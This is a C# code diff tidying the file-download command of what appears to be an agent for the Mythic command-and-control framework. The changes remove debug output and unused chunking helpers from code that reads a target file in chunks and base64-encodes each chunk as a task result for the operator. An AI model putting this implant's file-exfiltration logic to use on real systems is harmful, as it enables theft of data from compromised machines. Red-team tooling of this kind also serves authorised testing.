@@ -1,11 +1,7 @@
-﻿using System;
-using System.IO;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using Athena.Mythic.Model;
+﻿using Athena.Mythic.Model;
 using Athena.Utilities;
+using System;
+using System.IO;
 
 namespace Athena.Commands
 {
@@ -33,7 +29,6 @@ namespace Athena.Commands
             }
             else
             {
-
                 try
                 {
                     job.chunk_num = 1;
@@ -46,7 +41,6 @@ namespace Athena.Commands
                         int bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                         totalBytes += bytesRead;
                         byte[] testbuf = { buffer[0], buffer[1], buffer[2], buffer[3] };
-                        Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
                         j.taskresult = Misc.Base64Encode(buffer);
                         j.hasoutput = true;
                         while (j.taskresult != "")
@@ -56,7 +50,7 @@ namespace Athena.Commands
                         job.chunk_num++;
                         while (bytesRead > 0)
                         {
-                            if(fi.Length - totalBytes < job.chunk_size)
+                            if (fi.Length - totalBytes < job.chunk_size)
                             {
                                 buffer = new byte[fi.Length - totalBytes];
                                 bytesRead = fileStream.Read(buffer, 0, (int)(fi.Length - totalBytes));
@@ -68,12 +62,11 @@ namespace Athena.Commands
                             {
                                 bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                                 testbuf = new byte[] { buffer[0], buffer[1], buffer[2], buffer[3] };
-                                Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
                                 j.taskresult = Misc.Base64Encode(buffer);
                                 j.hasoutput = true;
                                 totalBytes += bytesRead;
                             }
-                            while(j.taskresult != "")
+                            while (j.taskresult != "")
                             {
 
                             }
@@ -105,70 +98,11 @@ namespace Athena.Commands
                 return e.Message;
             }
         }
-        public static string GetChunk(string File, int ChunkNum, int TotalChunks, long FileSize, int chunksize)
-        {
-            try
-            {
-                byte[] file_chunk = null;
-                long pos = ChunkNum * chunksize;
-                Console.WriteLine(pos);
-                using (FileStream fileStream = new FileStream(File, FileMode.Open))
-                {
-                    fileStream.Position = pos;
-                    if (TotalChunks == ChunkNum)
-                    {
-                        file_chunk = new byte[FileSize - (ChunkNum * chunksize)];
-                        int chunk_size = file_chunk.Length;
-                        fileStream.Read(file_chunk, 0, chunk_size);
-                    }
-                    else
-                    {
-                        file_chunk = new byte[chunksize];
-                        fileStream.Read(file_chunk, 0, chunksize);
-                    }
-                }
-                return Convert.ToBase64String(file_chunk);
-            }
-            catch
-            {
-                return "Error reading file";
-            }
-        }
         public static int GetTotalChunks(string File, int chunksize)
         {
             var fi = new FileInfo(File);
             int total_chunks = (int)(fi.Length + chunksize - 1) / chunksize;
             return total_chunks;
-        }
-
-        static void Split(string infile, string directoryPath, string Name, int ChunkSize, string ChunkName) //split function
-        {
-            Console.WriteLine("[*] - Starting Chunking");
-            int bytesToRead = 1000000 * ChunkSize;// 1mb
-            Console.WriteLine(bytesToRead);
-
-            try
-            {
-                FileStream fileStream = new FileStream(infile, FileMode.Open, FileAccess.Read);
-                using (fileStream)
-                {
-                    byte[] buffer = new byte[bytesToRead];
-                    fileStream.Seek(0, SeekOrigin.Begin);
-                    int bytesRead = fileStream.Read(buffer, 0, bytesToRead);
-                    while (bytesRead > 0)
-                    {
-                        bytesRead = fileStream.Read(buffer, 0, bytesToRead);
-                        byte[] testbuf = { buffer[0], buffer[1], buffer[2], buffer[3] };
-                        Console.WriteLine($"{BitConverter.ToString(testbuf)} ");
-                    }
-                    fileStream.Close();
-                    Console.WriteLine("[*] - Finished");
-                }
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("Error");
-            }
         }
     }
 }
